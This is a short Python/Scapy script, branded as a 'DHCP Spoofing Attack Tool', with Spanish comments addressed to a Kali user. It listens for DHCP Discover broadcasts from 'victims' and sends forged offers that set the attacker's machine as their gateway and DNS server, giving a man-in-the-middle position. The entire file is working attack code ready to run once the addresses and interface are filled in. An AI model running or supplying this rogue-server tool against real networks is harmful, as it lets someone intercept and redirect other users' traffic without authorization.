"""
██████╗ ██╗  ██╗ ██████╗██████╗ 
██╔══██╗██║  ██║██╔════╝██╔══██╗
██║  ██║███████║██║     ██████╔╝
██║  ██║██╔══██║██║     ██╔═══╝ 
██████╔╝██║  ██║╚██████╗██║     
╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝     

      DHCP SPOOFING ATTACK TOOL
      Rogue DHCP Server Script

  
"""


from scapy.all import *

# Configuración del ataque DHCP SPOOFING
MY_IP = "10.0.0.0"      # Tu IP de Kali
FAKE_GW = "10.0.0.0"    # Tú serás la puerta de enlace (Man in the Middle)
VICTIM_IP = "10.0.0.0" # La IP que le vas a regalar a la víctima
TARGET_MAC = "ff:ff:ff:ff:ff:ff" # Responder a todos (Broadcast)

def detect_dhcp(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # Si es un DHCP Discover
        print(f"[+] Víctima detectada pidiendo IP (MAC: {pkt[Ether].src})")
        send_rogue_offer(pkt)

def send_rogue_offer(packet):
    # Fabricar la respuesta maliciosa (DHCP Offer)
    ether = Ether(src=get_if_hwaddr("eth1"), dst=packet[Ether].src)
    ip = IP(src=MY_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, yiaddr=VICTIM_IP, siaddr=MY_IP, chaddr=packet[BOOTP].chaddr, xid=packet[BOOTP].xid)
    
    # Opciones Maliciosas: Gateway soy YO, DNS soy YO
    dhcp = DHCP(options=[
        ("message-type", "offer"),
        ("server_id", MY_IP),
        ("lease_time", 3600),
        ("subnet_mask", "255.255.255.0"),
        ("router", FAKE_GW),      # <--- El ataque está aquí
        ("name_server", MY_IP),   # <--- Y aquí
        "end"
    ])
    
    malicious_pkt = ether / ip / udp / bootp / dhcp
    print(f"[!] Enviando Oferta Maliciosa: IP={VICTIM_IP} GW={FAKE_GW}")
    sendp(malicious_pkt, iface="eth1", verbose=0) # CAMBIAR INTERFAZ

if __name__ == "__main__":
    print(f"[*] SPOOFING DHCP Server activo en la {MY_IP}...")
    print("[*] Esperando solicitudes DHCP ...")
    sniff(filter="udp and (port 67 or 68)", prn=detect_dhcp, iface="eth1") # CAMBIAR INTERFAZ
